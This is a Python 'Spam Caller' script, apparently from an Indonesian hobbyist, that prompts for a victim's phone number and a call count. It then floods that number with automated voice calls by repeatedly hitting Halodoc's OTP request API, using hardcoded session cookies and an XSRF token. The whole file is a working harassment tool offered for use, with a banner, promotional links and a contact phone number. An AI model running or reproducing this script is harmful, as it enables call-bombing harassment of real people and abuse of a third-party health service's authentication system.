# Scripted By MR_DARK
# Blom subs g boleh dec >_<

import requests, base64, sys, time, os
def ketik(s):
    for c in s + "\n":
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1./500)
abu="\033[1;90m"
biru="\033[1;96m"
putih="\033[1;97m"
hijau="\033[1;32m"
damn = "https://www.halodoc.com/api/v1/users/authentication/otp/requests"
merah="\033[1;31m"
ungu="\033[1;95m"
W=putih
R=merah
G=hijau
B=biru
y="\033[1;33m"
banner = f"""
{merah}⌜                                             {merah}⌝
   {biru}╔═╗{W}┌─┐┬  ┬   {merah}╦{putih}┌┬┐ {abu}|-{merah}»{biru}⟩ {putih}Creator {merah}: {putih}DARK-02
   {biru}║  {W}├─┤│  │   {merah}║{W} ││ {abu}|-{merah}»{biru}⟩ {putih}YouTube {merah}: {putih}MR_DARK
   {B}╚═╝{W}┴ ┴┴─┘┴─┘ {merah}╩{W}─┴┘ {abu}|-{merah}»{biru}⟩ {hijau}Caller Prank
           {y}<{R}/{y}>\033[1;0m\033[1;41mSpam Caller V1.0\033[1;0m{y}<{R}/{y}>
{merah}⌞                                             {merah}⌟
{W}┬───{R}⟨{W}Menu{R}⟩{W}────────────────
{W}├─{ungu}⟩ {W}1{R}.{W}Start Spam Call {R}({W}Call{R})
{W}├─{ungu}⟩ {W}2{R}.{W}Contact {R}({W}OWNER{R})
{W}├─{ungu}⟩ {W}3{R}.{W}Join Komunitas {R}({G}WhatsApp{R})
{W}├─{ungu}⟩ {R}0{R}.{W}Exit {R}({W}Keluar{R})
{W}└─────────────────────────
"""
cookies = {
    '_gcl_au': '1.1.1860823839.1661903409',
    '_ga': 'GA1.2.508329863.1661903409',
    'afUserId': '52293775-f4c9-4ce2-9002-5137c5a1ed24-p',
    'AF_SYNC': '1661903410542',
    'XSRF-TOKEN': '12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636',
    '_gid': 'GA1.2.149362930.1662348599',
    'ab.storage.deviceId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7': '%7B%22g%22%3A%2218bb4559-2170-9c14-ddcd-2dc80d13c3e3%22%2C%22c%22%3A1656491802961%2C%22l%22%3A1662348598944%7D',
    'amp_394863': 'nZm2vDUbDAvSia6NQPaGum...1gc5r57gc.1gc5r5qqq.7.0.7',
    'ab.storage.sessionId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7': '%7B%22g%22%3A%2275743aa4-31ee-9271-5c72-ba312bc0e48c%22%2C%22e%22%3A1662350418595%2C%22c%22%3A1662348598942%2C%22l%22%3A1662348618595%7D',
}

headers = {
    'authority': 'www.halodoc.com',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
    # Already added when you pass json=
    # 'content-type': 'application/json',
    # Requests sorts cookies= alphabetically
    # 'cookie': '_gcl_au=1.1.1860823839.1661903409; _ga=GA1.2.508329863.1661903409; afUserId=52293775-f4c9-4ce2-9002-5137c5a1ed24-p; AF_SYNC=1661903410542; XSRF-TOKEN=12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636; _gid=GA1.2.149362930.1662348599; _gat_UA-89605346-3=1; ab.storage.deviceId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%2218bb4559-2170-9c14-ddcd-2dc80d13c3e3%22%2C%22c%22%3A1656491802961%2C%22l%22%3A1662348598944%7D; amp_394863=nZm2vDUbDAvSia6NQPaGum...1gc5r57gc.1gc5r588m.6.0.6; ab.storage.sessionId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%2275743aa4-31ee-9271-5c72-ba312bc0e48c%22%2C%22e%22%3A1662350399577%2C%22c%22%3A1662348598942%2C%22l%22%3A1662348599577%7D',
    'origin': 'https://www.halodoc.com',
    'sec-ch-ua': '"Microsoft Edge";v="105", " Not;A Brand";v="99", "Chromium";v="105"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.27',
    'x-xsrf-token': '12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636',
}

os.system("clear")
ketik(f"{merah}>{W} Brut4l Call PROJECT")
time.sleep(1)
ketik(f"{merah}>{W} Scripted by MR_DARK & Anam YT")
time.sleep(1)
ketik(f"{merah}>{W} Supported by ROS HEKEL")
time.sleep(1)
os.system("xdg-open https://www.youtube.com/c/ROSHEKEL")
os.system("clear")
ketik(banner)
#s = requests.Session()
#dark = s.get('https://id.jagreward.com/member/register/', headers=headers).text

#darktoken = 'data-token="'
#if darktoken in dark:
#	token = dark.split('data-token="')[1].split('"')[0]
#	darkkey = dark.split('data-time="')[1].split('"')[0]
#else:
#	print ("kegagalan scrape telah terjadi!\ndisarankan untuk langsung kontak: 081327441039 via whatsapp")
#	exit()
#darkkeystr = str(darkkey)
#darkencsatu = darkkeystr.encode('ascii')
#darkencdua = base64.b64encode(darkencsatu)
#darkhasilenc = darkencdua.decode('ascii')
#data = {
#    'token': token,
#    'key': darkhasilenc,
#}
tanya = input(f"{W}Pilih {B}»{R}⟩{G} ")
if tanya == "1":
	nomor = input(f"{W}Nomor Target {abu}({putih}08{merah}xxxx{abu}){B}»{R}⟩{merah} {G}")
	jumlah = int(input(f"{W}Jumlah call {abu}({putih}5{abu}){B}»{R}⟩{merah} {G}"))
	json_data = {
	    'phone_number': '+62'+nomor,
	    'channel': 'voice',
	}
	#print (f"~> {darkhasilenc}")
	for i in range(int(jumlah)):
		responses = requests.post(damn, cookies=cookies, headers=headers, json=json_data).text
		#print (f"{W}raw {abu}-{G}[{W}{response}{G}]")
		print (f"{W}raw {abu}-{G}[{W}{responses}{G}]")
		if 'new_user":false' in responses:
			print (f"{W}Status {abu}-{biru}⟩  {G}Sukses")
			time.sleep(30)
		#ulang = input(f"{W}[{merah}?{W}] spam lagi{biru}? {W}({G}ya{W}/{merah}no{W}){merah}: {W}")
		#if 'y' in ulang:
		#	os.system("python main.py")
		#else:
		#	print ("session closed")
		#	exit()
		else:
			print (f"{W}Status {abu}-{biru}⟩  {merah}Gagal")
			time.sleep(30)
	ulang = input(f"{W}[{merah}?{W}] spam lagi{biru}? {W}({G}ya{W}/{merah}no{W}){merah}: {W}")
	if 'y' in ulang:
		os.system("python main.py")
	else:
		print ("session closed")
		exit()
elif tanya == "3":
	os.system("xdg-open https://chat.whatsapp.com/GfDPRMb91AD8UXpD2jbJVD")
elif tanya == "2":
	os.system("xdg-open https://wa.me/6281327441039")
elif tanya == "0":
	exit()
else:
	print (f"{merah}Error {W}input diluar dari table{merah}!")
	time.sleep(1)
	os.system("python3 main.py")
